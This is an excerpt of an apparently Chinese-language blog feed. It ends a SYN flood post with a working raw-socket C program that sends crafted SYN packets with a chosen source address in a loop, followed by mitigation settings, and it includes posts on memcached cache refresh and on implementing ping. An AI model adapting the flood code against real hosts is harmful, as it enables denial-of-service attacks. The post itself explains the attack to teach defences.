<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(1)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pseudo_header</span>    //<span class="title">needed</span> <span class="title">for</span> <span class="title">checksum</span> <span class="title">calculation</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> source_address;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> dest_address;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> placeholder;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> protocol;</span><br><span class="line">	<span class="keyword">unsigned</span> short tcp_length;</span><br><span class="line"> </span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> <span class="title">tcp</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack()</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> short <span class="title">csum</span><span class="params">(<span class="keyword">unsigned</span> short *ptr, <span class="keyword">int</span> nbytes)</span> </span>&#123;</span><br><span class="line"> <span class="keyword">long</span> sum;</span><br><span class="line"> <span class="keyword">unsigned</span> short oddbyte;</span><br><span class="line"> short answer;</span><br><span class="line"> </span><br><span class="line"> sum = <span class="number">0</span>;</span><br><span class="line"> <span class="keyword">while</span> (nbytes &gt; <span class="number">1</span>) &#123;</span><br><span class="line">   sum += *ptr++;</span><br><span class="line">   nbytes -= <span class="number">2</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span> (nbytes == <span class="number">1</span>) &#123;</span><br><span class="line">   oddbyte = <span class="number">0</span>;</span><br><span class="line">   *((u_char*) &amp;oddbyte) = *(u_char*) ptr;</span><br><span class="line">   sum += oddbyte;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> sum = (sum &gt;&gt; <span class="number">16</span>) + (sum &amp; <span class="number">0xffff</span>);</span><br><span class="line"> sum = sum + (sum &gt;&gt; <span class="number">16</span>);</span><br><span class="line"> answer = (short) ~sum;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">return</span> (answer);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">oneSyn</span><span class="params">(<span class="keyword">int</span> socketfd, <span class="keyword">in_addr_t</span> source, <span class="keyword">u_int16_t</span> sourcePort,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">in_addr_t</span> destination, <span class="keyword">u_int16_t</span> destinationPort)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">char</span> sendBuf[<span class="keyword">sizeof</span>(iphdr) + <span class="keyword">sizeof</span>(tcphdr)] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	bzero(sendBuf, <span class="keyword">sizeof</span>(sendBuf));</span><br><span class="line"> </span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span>* <span class="title">ipHeader</span> = (<span class="title">iphdr</span>*) <span class="title">sendBuf</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> *<span class="title">tcph</span> = (<span class="title">tcphdr</span>*) (<span class="title">sendBuf</span> + <span class="title">sizeof</span>(<span class="title">iphdr</span>));</span></span><br><span class="line"> </span><br><span class="line">	ipHeader-&gt;version = <span class="number">4</span>;</span><br><span class="line">	ipHeader-&gt;ihl = <span class="number">5</span>;</span><br><span class="line"> </span><br><span class="line">	ipHeader-&gt;tos = <span class="number">0</span>;</span><br><span class="line">	ipHeader-&gt;tot_len = htons(<span class="keyword">sizeof</span>(sendBuf));</span><br><span class="line"> </span><br><span class="line">	ipHeader-&gt;id = htons(<span class="number">1</span>);</span><br><span class="line">	ipHeader-&gt;frag_off = <span class="number">0</span>;</span><br><span class="line">	ipHeader-&gt;ttl = <span class="number">254</span>;</span><br><span class="line">	ipHeader-&gt;protocol = IPPROTO_TCP;</span><br><span class="line">	ipHeader-&gt;check = <span class="number">0</span>;</span><br><span class="line">	ipHeader-&gt;saddr = source;</span><br><span class="line">	ipHeader-&gt;daddr = destination;</span><br><span class="line"> </span><br><span class="line">	ipHeader-&gt;check = csum((<span class="keyword">unsigned</span> short*) ipHeader, ipHeader-&gt;ihl * <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//TCP Header</span></span><br><span class="line">	tcph-&gt;source = htons(sourcePort);</span><br><span class="line">	tcph-&gt;dest = htons(destinationPort);</span><br><span class="line">	tcph-&gt;seq = <span class="number">0</span>;</span><br><span class="line">	tcph-&gt;ack_seq = <span class="number">0</span>;</span><br><span class="line">	tcph-&gt;doff = <span class="number">5</span>; <span class="comment">//sizeof(tcphdr)/4</span></span><br><span class="line">	tcph-&gt;fin = <span class="number">0</span>;</span><br><span class="line">	tcph-&gt;syn = <span class="number">1</span>;</span><br><span class="line">	tcph-&gt;rst = <span class="number">0</span>;</span><br><span class="line">	tcph-&gt;psh = <span class="number">0</span>;</span><br><span class="line">	tcph-&gt;ack = <span class="number">0</span>;</span><br><span class="line">	tcph-&gt;urg = <span class="number">0</span>;</span><br><span class="line">	tcph-&gt;window = htons(<span class="number">512</span>);</span><br><span class="line">	tcph-&gt;check = <span class="number">0</span>;</span><br><span class="line">	tcph-&gt;urg_ptr = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//tcp header checksum</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pseudo_header</span> <span class="title">pseudoHeader</span>;</span></span><br><span class="line">	pseudoHeader.source_address = source;</span><br><span class="line">	pseudoHeader.dest_address = destination;</span><br><span class="line">	pseudoHeader.placeholder = <span class="number">0</span>;</span><br><span class="line">	pseudoHeader.protocol = IPPROTO_TCP;</span><br><span class="line">	pseudoHeader.tcp_length = htons(<span class="keyword">sizeof</span>(tcphdr));</span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;pseudoHeader.tcp, tcph, <span class="keyword">sizeof</span>(struct tcphdr));</span><br><span class="line"> </span><br><span class="line">	tcph-&gt;check = csum((<span class="keyword">unsigned</span> short*) &amp;pseudoHeader, <span class="keyword">sizeof</span>(pseudo_header));</span><br><span class="line"> </span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line">	<span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line">	<span class="built_in">sin</span>.sin_port = htons(sourcePort);</span><br><span class="line">	<span class="built_in">sin</span>.sin_addr.s_addr = destination;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">ssize_t</span> sentLen = sendto(socketfd, sendBuf, <span class="keyword">sizeof</span>(sendBuf), <span class="number">0</span>,</span><br><span class="line">			(struct sockaddr *) &amp;<span class="built_in">sin</span>, <span class="keyword">sizeof</span>(<span class="built_in">sin</span>));</span><br><span class="line">	<span class="keyword">if</span> (sentLen == <span class="number">-1</span>) &#123;</span><br><span class="line">		perror(<span class="string">"sent error"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="comment">//for setsockopt</span></span><br><span class="line">	<span class="keyword">int</span> optval = <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//create a raw socket</span></span><br><span class="line">	<span class="keyword">int</span> socketfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);</span><br><span class="line">	<span class="keyword">if</span> (socketfd == <span class="number">-1</span>) &#123;</span><br><span class="line">		perror(<span class="string">"create socket:"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (setsockopt(socketfd, IPPROTO_IP, IP_HDRINCL, &amp;optval, <span class="keyword">sizeof</span>(optval))</span><br><span class="line">			&lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">"create socket:"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">in_addr_t</span> source = inet_addr(<span class="string">"192.168.1.100"</span>);</span><br><span class="line">	<span class="keyword">in_addr_t</span> destination = inet_addr(<span class="string">"192.168.1.101"</span>);</span><br><span class="line">	<span class="keyword">u_int16_t</span> sourcePort = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">u_int16_t</span> destinationPort = <span class="number">9999</span>;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		oneSyn(socketfd, source, sourcePort++, destination,</span><br><span class="line">				destinationPort);</span><br><span class="line">		sourcePort %= <span class="number">65535</span>;</span><br><span class="line">		sleep(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于SYN flood攻击，调整下面三个参数就可以防范绝大部分的攻击了。</p>
<ul>
<li>增大tcp_max_syn_backlog</li>
<li>减小tcp_synack_retries</li>
<li>启用tcp_syncookies</li>
</ul>
<p>貌似现在的内核默认都是开启tcp_syncookies的。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="http://www.redhat.com/archives/rhl-devel-list/2005-January/msg00447.html" target="_blank" rel="noopener">http://www.redhat.com/archives/rhl-devel-list/2005-January/msg00447.html</a></li>
<li>man tcp</li>
<li><a href="http://nixcraft.com/showthread.php/16864-Linux-Howto-test-and-stop-syn-flood-attacks" target="_blank" rel="noopener">http://nixcraft.com/showthread.php/16864-Linux-Howto-test-and-stop-syn-flood-attacks</a></li>
<li><a href="http://en.wikipedia.org/wiki/SYN_cookies" target="_blank" rel="noopener">http://en.wikipedia.org/wiki/SYN_cookies</a></li>
<li><a href="https://github.com/torvalds/linux/blob/master/net/ipv4/syncookies.c" target="_blank" rel="noopener">https://github.com/torvalds/linux/blob/master/net/ipv4/syncookies.c</a></li>
<li><a href="http://www.91ri.org/7075.html" target="_blank" rel="noopener">http://www.91ri.org/7075.html</a></li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>security</tag>
        <tag>tcp</tag>
      </tags>
  </entry>
  <entry>
    <title>应对Memcached缓存失效，导致高并发查询DB的几种思路</title>
    <url>/memcached-cache-db/</url>
    <content><![CDATA[<h2 id="update"><a href="#update" class="headerlink" title="update"></a>update</h2><p>最近看到nginx的合并回源，这个和下面的思路有点像。不过nginx的思路还是在控制缓存失效时的并发请求，而不是当缓存快要失效时，及时地更新缓存。</p>
<p>nginx合并回源，参考：<a href="http://blog.csdn.net/brainkick/article/details/8570698" target="_blank" rel="noopener">http://blog.csdn.net/brainkick/article/details/8570698</a></p>
<p>update: 2015-04-23</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当Memcached缓存失效时，容易出现高并发的查询DB，导致DB压力骤然上升。</p>
<p>这篇blog主要是探讨如何在缓存将要失效时，及时地更新缓存，而不是如何在缓存失效之后，如何防止高并发的DB查询。</p>
<p><strong>个人认为，当缓存将要失效时，及时地把新的数据刷到memcached里，这个是解决缓存失效瞬间高并发查DB的最好方法。那么如何及时地知道缓存将要失效？</strong></p>
<p>解决这个问题有几种思路：</p>
<p>比如一个key是aaa，失效时间是30s。</p>
<h3 id="定期从DB里查询数据，再刷到memcached里"><a href="#定期从DB里查询数据，再刷到memcached里" class="headerlink" title="定期从DB里查询数据，再刷到memcached里"></a>定期从DB里查询数据，再刷到memcached里</h3><p>这种方法有个缺点是，有些业务的key可能是变化的，不确定的。</p>
<p>而且不好界定哪些数据是应该查询出来放到缓存中的，难以区分冷热数据。</p>
<h3 id="当缓存取到为null时，加锁去查询DB，只允许一个线程去查询DB"><a href="#当缓存取到为null时，加锁去查询DB，只允许一个线程去查询DB" class="headerlink" title="当缓存取到为null时，加锁去查询DB，只允许一个线程去查询DB"></a>当缓存取到为null时，加锁去查询DB，只允许一个线程去查询DB</h3><p>这种方式不太靠谱，不多讨论。而且如果是多个web服务器的话，还是有可能有并发的操作。</p>
<h3 id="在向memcached写入value时，同时写入当前机器在时间作为过期时间"><a href="#在向memcached写入value时，同时写入当前机器在时间作为过期时间" class="headerlink" title="在向memcached写入value时，同时写入当前机器在时间作为过期时间"></a>在向memcached写入value时，同时写入当前机器在时间作为过期时间</h3><p>当get得到数据时，如果当前时间 - 过期时间 &gt; 5s，则后台启动一个任务去查询DB，更新缓存。</p>
<p>当然，这里的后台任务必须保证同一个key，只有一个线程在执行查询DB的任务，不然这个还是高并发查询DB。</p>
<p>缺点是要把过期时间和value合在一起序列化，取出数据后，还要反序列化。很不方便。</p>
<p>网上大部分文章提到的都是前面两种方式，有少数文章提到第3种方式。下面提出一种基于两个key的方法：</p>
<h3 id="两个key，一个key用来存放数据，另一个用来标记失效时间"><a href="#两个key，一个key用来存放数据，另一个用来标记失效时间" class="headerlink" title="两个key，一个key用来存放数据，另一个用来标记失效时间"></a>两个key，一个key用来存放数据，另一个用来标记失效时间</h3><p>比如key是aaa，设置失效时间为30s，则另一个key为expire_aaa，失效时间为25s。</p>
<p>在取数据时，用multiget，同时取出aaa和expire_aaa，如果expire_aaa的value == null，则后台启动一个任务去查询DB，更新缓存。和上面类似。</p>
<p>对于后台启动一个任务去查询DB，更新缓存，要保证一个key只有一个线程在执行，这个如何实现？</p>
<p>对于同一个进程，简单加锁即可。拿到锁的就去更新DB，没拿到锁的直接返回。</p>
<p>对于集群式的部署的，如何实现只允许一个任务执行？</p>
<p>这里就要用到memcached的add命令了。</p>
<p><strong>add命令是如果不存在key，则设置成功，返回true，如果已存在key，则不存储，返回false。</strong></p>
<p>当get expired_aaa是null时，则add expired_aaa 过期时间由自己灵活处理。比如设置为3秒。</p>
<p>如果成功了，再去查询DB，查到数据后，再set expired_aaa为25秒。set aaa 为30秒。</p>
<p>综上所述，来梳理下流程：</p>
<p>比如一个key是aaa，失效时间是30s。查询DB在1s内。</p>
<ul>
<li>put数据时，设置aaa过期时间30s，设置expire_aaa过期时间25s；</li>
<li>get数据时，multiget  aaa 和 expire_aaa，如果expired_aaa对应的value != null，则直接返回aaa对应的数据给用户。如果expire_aaa返回value == null，则后台启动一个任务，尝试add expire_aaa，并设置超时过间为3s。这里设置为3s是为了防止后台任务失败或者阻塞，如果这个任务执行失败，那么3秒后，如果有另外的用户访问，那么可以再次尝试查询DB。如果add执行成功，则查询DB，再更新aaa的缓存，并设置expire_aaa的超时时间为25s。 </li>
</ul>
<h3 id="时间存到Value里，再结合add命令来保证只有一个线程去刷新数据"><a href="#时间存到Value里，再结合add命令来保证只有一个线程去刷新数据" class="headerlink" title="时间存到Value里，再结合add命令来保证只有一个线程去刷新数据"></a>时间存到Value里，再结合add命令来保证只有一个线程去刷新数据</h3><p>update:2014-06-29</p>
<p>最近重新思考了下这个问题。发现第4种两个key的办法比较耗memcached的内存，因为key数翻倍了。结合第3种方式，重新设计了下，思路如下：</p>
<ul>
<li><p>仍然使用两个key的方案：key 和 __load_{key}</p>
<p>  其中，__load_{key} 这个key相当于一个锁，只允许add成功的线程去更新数据，而这个key的超时时间是比较短的，不会一直占用memcached的内存。</p>
</li>
<li><p>在set 到Memcached的value中，加上一个时间，(time, value)，time是memcached上的key未来会过期的时间，并不是当前系统时间。</p>
</li>
<li>当get到数据时，检查时间是否快要超时： time - now &lt; 5 * 1000，假定设置了快要超时的时间是5秒。</li>
<li><p>如果是，则后台启动一个新的线程：</p>
<ul>
<li>尝试 add __load_{key}，</li>
<li>如果成功，则去加载新的数据，并set到memcached中。</li>
<li>原来的线程直接返回value给调用者。</li>
</ul>
</li>
</ul>
<p>按上面的思路，用xmemcached封装了下：</p>
<p>DataLoader，用户要实现的加载数据的回调接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">DataLoader</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">load</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>RefreshCacheManager，用户只需要关心这这两个接口函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RefreshCacheManager</span> </span>&#123;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">tryGet</span><span class="params">(MemcachedClient memcachedClient, <span class="keyword">final</span> String key, <span class="keyword">final</span> <span class="keyword">int</span> expire, <span class="keyword">final</span> DataLoader dataLoader)</span></span>;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">autoRetryGet</span><span class="params">(MemcachedClient memcachedClient, <span class="keyword">final</span> String key, <span class="keyword">final</span> <span class="keyword">int</span> expire, <span class="keyword">final</span> DataLoader dataLoader)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中autoRetryGet函数如果get到是null，内部会自动重试4次，每次间隔500ms。</p>
<p>RefreshCacheManager内部自动处理数据快过期，重新刷新到memcached的逻辑。</p>
<p>详细的封装代码在这里：<a href="https://gist.github.com/hengyunabc/cc57478bfcb4cd0553c2" target="_blank" rel="noopener">https://gist.github.com/hengyunabc/cc57478bfcb4cd0553c2</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我个人是倾向于第5种方式的，因为很简单，直观。<strong>比第4种方式要节省内存，而且不用mget，在使用memcached集群时不用担心出麻烦事。</strong></p>
<p>这种两个key的方式，还有一个好处，就是数据是自然冷热适应的。如果是冷数据，30秒都没有人访问，那么数据会过期。</p>
<p>如果是热门数据，一直有大流量访问，那么数据就是一直热的，而且数据一直不会过期。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>memcached</tag>
        <tag>cache</tag>
      </tags>
  </entry>
  <entry>
    <title>扯谈网络编程之自己实现ping</title>
    <url>/about-ping/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>ping是基于ICMP（Internet Control Message Protocol）协议实现的，而ICMP协议是在IP层实现的。</p>
<p>ping实际上是发起者发送一个Echo Request(type = 8)的，远程主机回应一个Echo Reply(type = 0)的过程。</p>
<h2 id="为什么用ping不能测试某一个端口"><a href="#为什么用ping不能测试某一个端口" class="headerlink" title="为什么用ping不能测试某一个端口"></a>为什么用ping不能测试某一个端口</h2><p>刚开始接触网络的时候，可能很多人都有疑问，怎么用ping来测试远程主机的某个特定端口？</p>
<p>其实如果看下ICMP协议，就可以发现ICMP里根本没有端口这个概念，也就根本无法实现测试某一个端口了。</p>
<p>ICMP协议的包格式可以直接参考wiki： <a href="https://en.wikipedia.org/wiki/Ping_(networking_utility)#ICMP_packet" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Ping_(networking_utility)#ICMP_packet</a></p>
<h2 id="Ping如何计算请问耗时"><a href="#Ping如何计算请问耗时" class="headerlink" title="Ping如何计算请问耗时"></a>Ping如何计算请问耗时</h2><p>在ping命令的输出上，可以看到有显示请求的耗时，那么这个耗时是怎么得到的呢？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=6.28 ms</span><br></pre></td></tr></table></figure>
<p>从Echo Request的格式里，看到不时间相关的东东，但是因为是Echo，即远程主机会原样返回Data数据，所以Ping的发起方把时间放到了Data数据里，当得到Echo Reply里，取到发送时间，再和当前时间比较，就可以得到耗时了。当然，还有其它的思路，比如记录每一个包的发送时间，当得到返回时，再计算得到时间差，但显然这样的实现太复杂了。</p>
<h2 id="Ping如何区分不同的进程？"><a href="#Ping如何区分不同的进程？" class="headerlink" title="Ping如何区分不同的进程？"></a>Ping如何区分不同的进程？</h2><p>我们都知道本机IP，远程IP，本机端口，远程端口，四个元素才可以确定唯的一个信道。而ICMP里没有端口，那么一个ping程序如何知道哪些包才是发给自己的？或者说操作系统如何区别哪个Echo Reply是要发给哪个进程的？</p>
<p><strong>实际上操作系统不能区别，所有的本机IP，远程IP相同的ICMP程序都可以接收到同一份数据。</strong></p>
<p>程序自己要根据Identifier来区分到底一个ICMP包是不是发给自己的。在Linux下，Ping发出去的Echo Request包里Identifier就是进程pid，远程主机会返回一个Identifier相同的Echo Reply包。</p>
<p>可以接下面的方法简单验证：</p>
<p>启动系统自带的ping程序，查看其pid。</p>
<p>设定自己实现的ping程序的identifier为上面得到的pid，然后发Echo Request包。</p>
<p>可以发现系统ping程序会接收到远程主机的回应。</p>
<h2 id="自己实现ping"><a href="#自己实现ping" class="headerlink" title="自己实现ping"></a>自己实现ping</h2><p>自己实现ping要用到rawsocket，在linux下需要root权限。网上有很多实现的程序，但是有很多地方不太对的。自己总结实现了一个（最好用g++编绎）：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> short <span class="title">csum</span><span class="params">(<span class="keyword">unsigned</span> short *ptr, <span class="keyword">int</span> nbytes)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">register</span> <span class="keyword">long</span> sum;</span><br><span class="line">	<span class="keyword">unsigned</span> short oddbyte;</span><br><span class="line">	<span class="keyword">register</span> short answer;</span><br><span class="line"> </span><br><span class="line">	sum = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (nbytes &gt; <span class="number">1</span>) &#123;</span><br><span class="line">		sum += *ptr++;</span><br><span class="line">		nbytes -= <span class="number">2</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (nbytes == <span class="number">1</span>) &#123;</span><br><span class="line">		oddbyte = <span class="number">0</span>;</span><br><span class="line">		*((u_char*) &amp;oddbyte) = *(u_char*) ptr;</span><br><span class="line">		sum += oddbyte;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	sum = (sum &gt;&gt; <span class="number">16</span>) + (sum &amp; <span class="number">0xffff</span>);</span><br><span class="line">	sum = sum + (sum &gt;&gt; <span class="number">16</span>);</span><br><span class="line">	answer = (short) ~sum;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> (answer);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">double</span> <span class="title">countMs</span><span class="params">(timeval before, timeval after)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (after.tv_sec - before.tv_sec)*<span class="number">1000</span> + (after.tv_usec - before.tv_usec)/<span class="number">1000.0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(1)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EchoPacket</span> &#123;</span></span><br><span class="line">	<span class="keyword">u_int8_t</span> type;</span><br><span class="line">	<span class="keyword">u_int8_t</span> code;</span><br><span class="line">	<span class="keyword">u_int16_t</span> checksum;</span><br><span class="line">	<span class="keyword">u_int16_t</span> identifier;</span><br><span class="line">	<span class="keyword">u_int16_t</span> sequence;</span><br><span class="line">	timeval timestamp;</span><br><span class="line">	<span class="keyword">char</span> data[<span class="number">40</span>];   <span class="comment">//sizeof(EchoPacket) == 64</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack()</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ping</span><span class="params">(<span class="keyword">in_addr_t</span> source, <span class="keyword">in_addr_t</span> destination)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">int</span> sequence = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">int</span> pid = getpid();</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">int</span> ipId = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">char</span> sendBuf[<span class="keyword">sizeof</span>(iphdr) + <span class="keyword">sizeof</span>(EchoPacket)] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"> </span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span>* <span class="title">ipHeader</span> = (<span class="title">iphdr</span>*)<span class="title">sendBuf</span>;</span></span><br><span class="line">	ipHeader-&gt;version = <span class="number">4</span>;</span><br><span class="line">	ipHeader-&gt;ihl = <span class="number">5</span>;</span><br><span class="line"> </span><br><span class="line">	ipHeader-&gt;tos = <span class="number">0</span>;</span><br><span class="line">	ipHeader-&gt;tot_len = htons(<span class="keyword">sizeof</span>(sendBuf));</span><br><span class="line"> </span><br><span class="line">	ipHeader-&gt;id = htons(ipId++);</span><br><span class="line">	ipHeader-&gt;frag_off = htons(<span class="number">0x4000</span>);  <span class="comment">//set Flags: don't fragment</span></span><br><span class="line"> </span><br><span class="line">	ipHeader-&gt;ttl = <span class="number">64</span>;</span><br><span class="line">	ipHeader-&gt;protocol = IPPROTO_ICMP;</span><br><span class="line">	ipHeader-&gt;check = <span class="number">0</span>;</span><br><span class="line">	ipHeader-&gt;saddr = source;</span><br><span class="line">	ipHeader-&gt;daddr = destination;</span><br><span class="line"> </span><br><span class="line">	ipHeader-&gt;check = csum((<span class="keyword">unsigned</span> short*)ipHeader, ipHeader-&gt;ihl * <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">	EchoPacket* echoRequest = (EchoPacket*)(sendBuf + <span class="keyword">sizeof</span>(iphdr));</span><br><span class="line">	echoRequest-&gt;type = <span class="number">8</span>;</span><br><span class="line">	echoRequest-&gt;code = <span class="number">0</span>;</span><br><span class="line">	echoRequest-&gt;checksum = <span class="number">0</span>;</span><br><span class="line">	echoRequest-&gt;identifier = htons(pid);</span><br><span class="line">	echoRequest-&gt;sequence = htons(sequence++);</span><br><span class="line">	gettimeofday(&amp;(echoRequest-&gt;timestamp), <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">u_int16_t</span> ccsum = csum((<span class="keyword">unsigned</span> short*)echoRequest, <span class="keyword">sizeof</span>(sendBuf) - <span class="keyword">sizeof</span>(iphdr));</span><br><span class="line"> </span><br><span class="line">	echoRequest-&gt;checksum = ccsum;</span><br><span class="line"> </span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line">	<span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line">	<span class="built_in">sin</span>.sin_port = htons(<span class="number">0</span>);</span><br><span class="line">	<span 